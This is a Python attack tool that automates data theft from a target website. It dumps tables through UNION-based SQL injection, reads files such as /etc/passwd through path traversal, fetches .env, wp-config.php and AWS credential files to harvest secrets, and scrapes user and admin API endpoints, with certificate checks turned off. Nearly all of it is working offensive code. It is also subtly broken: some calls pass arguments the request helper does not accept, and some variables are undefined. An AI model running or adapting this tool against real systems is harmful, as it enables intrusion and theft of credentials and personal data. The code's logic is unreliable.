#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Data Extractor — Extrai dados de vulnerabilidades encontradas
SQLi data dump, LFI file contents, JWT claim extraction, API data scraping
"""

import sys
import json
import time
import base64
import re
import ssl
import urllib.request
import urllib.error
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from collections import Counter


class DataExtractor:
    """Extrai e estrutura dados de fontes vulneraveis"""

    def __init__(self, target: str, token: str = None, cookie: str = None,
                 timeout: int = 10):
        self.target = target
        self.base_url = f"https://{target}"
        self.token = token
        self.cookie = cookie
        self.timeout = timeout
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        self.user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        self.extracted_data: Dict = {}
        self.exported_files: List[str] = []

    def _request(self, url: str, method: str = 'GET', data: dict = None,
                 headers: dict = None) -> Tuple[int, str]:
        """Generic request"""
        try:
            req_headers = {'User-Agent': self.user_agent, 'Accept': '*/*'}
            if self.token:
                req_headers['Authorization'] = f'Bearer {self.token}'
            if self.cookie:
                req_headers['Cookie'] = self.cookie
            if headers:
                req_headers.update(headers)

            if method == 'POST' and data:
                body = urllib.parse.urlencode(data).encode()
                req_headers['Content-Type'] = 'application/x-www-form-urlencoded'
                req = urllib.request.Request(url, data=body, headers=req_headers, method=method)
            else:
                req = urllib.request.Request(url, headers=req_headers, method=method)

            with urllib.request.urlopen(req, timeout=self.timeout, context=self.ctx) as resp:
                return resp.status, resp.read().decode('utf-8', errors='ignore')
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', errors='ignore')[:2000] if e.fp else ''
            return e.code, body
        except Exception as e:
            return 0, str(e)

    # ================================================================
    # SQLi DATA EXTRACTION
    # ================================================================

    def extract_sqli_data(self, vuln_url: str, param: str, table: str = None,
                          columns: List[str] = None, limit: int = 100) -> Dict:
        """Extrai dados de SQLi baseada em UNION"""
        print(f"\n  [EXTRACT] SQLi data extraction from {vuln_url}")
        result = {'type': 'SQLi Data Extraction', 'table': table, 'data': [], 'success': False}

        # Determine column count (binary search would be better but linear is simpler)
        col_count = None
        for cols in range(1, 12):
            payload = f"' UNION SELECT {' '.join(['NULL' for _ in range(cols)])}--"
            status, body = self._request(vuln_url, params={param: payload})
            if status == 200 and 'NULL' in body:
                col_count = cols
                print(f"    Columns detected: {col_count}")
                break

        if col_count is None:
            result['error'] = 'Could not determine column count'
            return result

        if not table:
            # Auto-detect tables
            print("    Detecting tables...")
            tables_payload = f"' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 10--"
            status, body = self._request(vuln_url, params={param: tables_payload})
            tables = re.findall(r'([\w]+)', body)
            tables = [t for t in tables if t.lower() not in ['null', 'information', 'schema', 'tables']]
            if tables:
                table = tables[0]
                print(f"    First table found: {table}")
            else:
                result['error'] = 'No tables found'
                return result

        if not columns:
            # Auto-detect columns
            print(f"    Detecting columns for {table}...")
            cols_payload = f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT 10--"
            status, body = self._request(vuln_url, params={param: cols_payload})
            cols = re.findall(r'([\w]+)', body)
            cols = [c for c in cols if c.lower() not in ['null', 'column', 'name']]
            if cols:
                columns = cols[:min(5, len(cols))]
                print(f"    Columns: {columns}")
            else:
                columns = ['id', 'name']

        if columns:
            col_list = ','.join(columns)
            data_payload = f"' UNION SELECT {col_list} FROM {table} LIMIT {limit}--"
            status, body = self._request(vuln_url, params={param: data_payload})

            if status == 200:
                # Parse the extracted data
                rows = self._parse_row_output(body, len(columns))
                result['data'] = rows
                result['table'] = table
                result['columns'] = columns
                result['success'] = True
                result['rows_extracted'] = len(rows)
                print(f"    [DATA] Extracted {len(rows)} rows from {table}")

                # Export to JSON
                if rows:
                    filename = f"sqli_{table}_data.json"
                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump({'table': table, 'columns': columns, 'rows': rows}, f, indent=2)
                    self.exported_files.append(filename)
                    print(f"    [EXPORT] Saved to {filename}")

        return result

    def _parse_row_output(self, body: str, col_count: int) -> List[Dict]:
        """Parse HTML/body output into structured rows"""
        rows = []
        # Try to find patterns that look like data rows
        patterns = [
            r'>([^<]{3,100})<',  # Content between tags
            r'>([\w@.\-]+)<',     # Simple word patterns
        ]

        for pattern in patterns:
            matches = re.findall(pattern, body)
            if matches and len(matches) >= col_count:
                # Group into rows
                for i in range(0, min(len(matches), 50), col_count):
                    row = {columns[j]: matches[i+j] if j < len(matches) else ''
                           for j in range(col_count)}
                    if any(row.values()):
                        rows.append(row)
                break

        return rows[:limit]

    # ================================================================
    # LFI FILE EXTRACTION
    # ================================================================

    def extract_lfi_file(self, vuln_url: str, param: str, filepath: str) -> Dict:
        """Extrai conteudo de arquivo via LFI"""
        print(f"\n  [EXTRACT] LFI file extraction: {filepath}")
        result = {'type': 'LFI File Extraction', 'file': filepath, 'content': '', 'success': False}

        payloads = [
            filepath,
            f"{'../' * 10}{filepath}",
            f"%2e%2e/%2e%2e/{filepath}",
            f"..\\..\\..\\{filepath}",
        ]

        for payload in payloads:
            status, body = self._request(vuln_url, params={param: payload})
            if status == 200 and len(body) > 20:
                # Check if we got file content
                if any(sig in body for sig in ['root:', ':/bin/', '<?php', 'Password', 'secret']):
                    result['content'] = body
                    result['success'] = True
                    print(f"    [CONTENT] {len(body)} bytes extracted")

                    # Auto-detect file type and save
                    ext = self._detect_file_type(body)
                    if ext:
                        safe_path = filepath.replace('/', '_').replace('\\', '_')
                        filename = f"lfi_{safe_path}{ext}"
                        with open(filename, 'w', encoding='utf-8') as f:
                            f.write(body)
                        self.exported_files.append(filename)
                        print(f"    [EXPORT] Saved to {filename}")
                    break

        return result

    def _detect_file_type(self, content: str) -> str:
        """Detect file type from content"""
        if content.startswith('<?php'):
            return '.php'
        elif content.startswith('#') and 'password' in content.lower():
            return '.env'
        elif '{' in content and '}' in content:
            try:
                json.loads(content)
                return '.json'
            except:
                pass
        elif content.startswith('-----BEGIN'):
            return '.key'
        elif '/bin/' in content and ':' in content:
            return '.txt'
        return ''

    # ================================================================
    # JWT DATA EXTRACTION
    # ================================================================

    def extract_jwt_data(self, token: str) -> Dict:
        """Extrai dados estruturados do JWT"""
        print(f"\n  [EXTRACT] JWT data extraction")
        result = {'type': 'JWT Data Extraction', 'claims': {}, 'success': False}

        try:
            parts = token.split('.')
            if len(parts) != 3:
                result['error'] = 'Invalid JWT format'
                return result

            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

            result['header'] = header
            result['payload'] = payload
            result['success'] = True

            # Structure useful claims
            useful_claims = {}
            for key, value in payload.items():
                if key in ('sub', 'user_id', 'userId', 'uid', 'id', 'username', 'email',
                           'name', 'role', 'permissions', 'scopes', 'iat', 'exp', 'nbf'):
                    useful_claims[key] = value

            result['useful_claims'] = useful_claims
            print(f"    Claims: {list(payload.keys())}")
            if 'role' in payload:
                print(f"    Role: {payload['role']}")
            if 'user_id' in payload or 'sub' in payload:
                uid = payload.get('user_id') or payload.get('sub')
                print(f"    User ID: {uid}")

        except Exception as e:
            result['error'] = str(e)

        return result

    # ================================================================
    # API DATA SCRAPING
    # ================================================================

    def scrape_api_data(self, base_url: str = None, endpoints: List[str] = None) -> Dict:
        """Raspa dados de APIs descobertas"""
        print(f"\n  [EXTRACT] API data scraping")
        result = {'type': 'API Data Scraping', 'data': {}, 'success': False}

        url = base_url or self.base_url
        api_paths = endpoints or [
            '/api/v1/users', '/api/v1/accounts', '/api/v1/customers',
            '/api/users', '/api/admin/users', '/api/public/config',
            '/api/config', '/api/settings', '/api/metrics',
        ]

        for path in api_paths:
            full_url = f"{url}{path}"
            status, body = self._request(full_url)

            if status == 200 and body:
                try:
                    data = json.loads(body)
                    result['data'][path] = data
                    result['success'] = True
                    print(f"    [DATA] {path} -> {len(json.dumps(data))} bytes")
                except json.JSONDecodeError:
                    if len(body) > 50:
                        result['data'][path] = {'raw': body[:500]}

        # Export
        if result['data']:
            filename = f"api_data_{self.target}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(result['data'], f, indent=2, ensure_ascii=False)
            self.exported_files.append(filename)
            print(f"    [EXPORT] Saved to {filename}")

        return result

    # ================================================================
    # SENSITIVE FILE EXTRACTION
    # ================================================================

    def extract_sensitive_files(self, paths: List[str] = None) -> Dict:
        """Extrai conteudo de arquivos sensiveis"""
        print(f"\n  [EXTRACT] Sensitive file extraction")
        result = {'type': 'Sensitive File Extraction', 'files': [], 'success': False}

        default_paths = [
            '/.env', '/.env.local', '/.env.production',
            '/.git/config', '/config.php', '/wp-config.php',
            '/.aws/credentials', '/server-status',
        ]

        for path in paths or default_paths:
            url = f"{self.base_url}{path}"
            status, body = self._request(url)

            if status == 200 and len(body) > 10:
                finding = {
                    'path': path,
                    'size': len(body),
                    'content_preview': body[:200],
                }

                # Check for secrets
                secrets = re.findall(r'(?:password|secret|key|token|api_key)\s*[:=]\s*["\']?([^\s"\'&]{4,})',
                                     body, re.I)
                finding['secrets_found'] = secrets[:5]

                result['files'].append(finding)
                result['success'] = True

                if secrets:
                    print(f"    [CRITICAL] {path} contains {len(secrets)} secrets!")
                    for s in secrets[:3]:
                        print(f"      - {s[:30]}...")
                else:
                    print(f"    [FILE] {path} ({len(body)} bytes)")

        # Export
        if result['files']:
            filename = f"sensitive_files_{self.target}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(result['files'], f, indent=2, ensure_ascii=False)
            self.exported_files.append(filename)

        return result

    # ================================================================
    # FULL EXTRACTION PIPELINE
    # ================================================================

    def run_full_extraction(self, vuln_report: Dict) -> Dict:
        """Pipeline completo de extracao de dados"""
        print("\n" + "=" * 70)
        print("  DATA EXTRACTOR — Automated Data Extraction")
        print("=" * 70)

        all_results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'extractions': [],
            'exported_files': [],
            'summary': {'total_extracted': 0, 'secrets_found': 0},
        }

        vulns = vuln_report.get('vulnerabilities', [])
        tokens = vuln_report.get('tokens', {}).get('jwt_tokens', [])
        sensitive = vuln_report.get('sensitive_files', [])

        # 1. JWT data extraction
        for tok_info in tokens[:3]:
            r = self.extract_jwt_data(tok_info.get('token', ''))
            all_results['extractions'].append(r)
            if r.get('success'):
                all_results['summary']['total_extracted'] += 1

        # 2. SQLi data extraction (from report)
        sqli_vulns = [v for v in vulns if v.get('type') == 'SQL Injection']
        for vuln in sqli_vulns[:2]:
            r = self.extract_sqli_data(
                vuln.get('url', self.base_url),
                vuln.get('param', 'id')
            )
            all_results['extractions'].append(r)
            if r.get('success'):
                all_results['summary']['total_extracted'] += r.get('rows_extracted', 0)
                if r.get('data'):
                    all_results['summary']['secrets_found'] += 1

        # 3. LFI extraction
        lfi_vulns = [v for v in vulns if v.get('type') in ('LFI/RFI', 'Path Traversal')]
        for vuln in lfi_vulns[:2]:
            r = self.extract_lfi_file(
                vuln.get('url', self.base_url),
                vuln.get('param', 'file'),
                '/etc/passwd'
            )
            all_results['extractions'].append(r)
            if r.get('success'):
                all_results['summary']['total_extracted'] += 1

        # 4. Sensitive files
        r = self.extract_sensitive_files()
        all_results['extractions'].append(r)
        if r.get('success'):
            all_results['summary']['secrets_found'] += len([f for f in r.get('files', [])
                                                             if f.get('secrets_found')])
            all_results['summary']['total_extracted'] += len(r.get('files', []))

        # 5. API scraping
        r = self.scrape_api_data()
        all_results['extractions'].append(r)
        if r.get('success'):
            all_results['summary']['total_extracted'] += len(r.get('data', {}))

        all_results['exported_files'] = self.exported_files

        print("\n" + "=" * 70)
        print(f"  EXTRACTION SUMMARY")
        print("=" * 70)
        print(f"  Total extractions: {all_results['summary']['total_extracted']}")
        print(f"  Secrets found: {all_results['summary']['secrets_found']}")
        print(f"  Files exported: {len(all_results['exported_files'])}")
        for f in all_results['exported_files']:
            print(f"    - {f}")

        return all_results


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Data Extractor')
    parser.add_argument('target', help='Target domain')
    parser.add_argument('--report', '-r', help='Vulnerability report JSON')
    parser.add_argument('--token', '-t', help='JWT token')
    parser.add_argument('--output', '-o', help='Output file')

    args = parser.parse_args()

    extractor = DataExtractor(args.target, token=args.token)

    if args.report:
        with open(args.report, 'r', encoding='utf-8') as f:
            report = json.load(f)
        result = extractor.run_full_extraction(report)
    else:
        result = {'error': 'No vulnerability report provided'}

    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=2, ensure_ascii=False, default=str)
        print(f"\n[SAVE] Results saved to {args.output}")
    else:
        print(json.dumps(result, indent=2, ensure_ascii=False, default=str))


if __name__ == "__main__":
    main()
